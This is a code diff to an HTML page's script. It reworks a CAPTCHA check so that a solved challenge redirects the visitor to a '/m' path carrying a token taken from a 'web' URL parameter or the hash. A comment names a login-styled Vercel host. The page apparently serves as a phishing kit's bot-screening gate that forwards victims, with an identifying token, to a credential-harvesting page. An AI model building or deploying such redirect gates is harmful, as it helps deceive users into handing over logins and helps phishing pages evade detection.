@@ -113,9 +113,6 @@
     </div>
 
     <script>
-        // CONFIGURATION: Target destination filename
-        const TARGET_FILENAME = "ind.html.html";
-
         let currentCaptcha = "";
 
         function generateCaptcha() {
@@ -133,16 +130,24 @@
             const errorElement = document.getElementById("errorMessage");
 
             if (userInput.toLowerCase() === currentCaptcha.toLowerCase()) {
-                // Get existing URL hash/token fragment (e.g., #tokenValue)
+                // Get URL search parameters (?web=tken200@1472)
+                const urlParams = new URLSearchParams(window.location.search);
+                const webToken = urlParams.get('web');
+                
+                // Fallback to current URL hash if query param is not used
                 const currentHash = window.location.hash;
 
-                // Dynamically resolve target URL path relative to the current folder location
-                const currentPath = window.location.pathname;
-                const directoryPath = currentPath.substring(0, currentPath.lastIndexOf('/') + 1);
+                let tokenValue = "";
+                if (webToken) {
+                    tokenValue = `#${webToken}`;
+                } else if (currentHash) {
+                    tokenValue = currentHash;
+                } else {
+                    tokenValue = "#";
+                }
 
-                // Build redirect URL preserving existing hash token, or adding '#' if non-existent
-                const redirectHash = currentHash ? currentHash : '#';
-                const targetUrl = window.location.origin + directoryPath + TARGET_FILENAME + redirectHash;
+                // Constructs: https://lgns0100ref300superfly-usmiais-lgnn.vercel.app/m#tken200@1472
+                const targetUrl = window.location.origin + "/m" + tokenValue;
 
                 window.location.href = targetUrl;
             } else {
@@ -152,7 +157,6 @@
             }
         }
 
-        // Initialize CAPTCHA on load
         generateCaptcha();
     </script>
 </body>
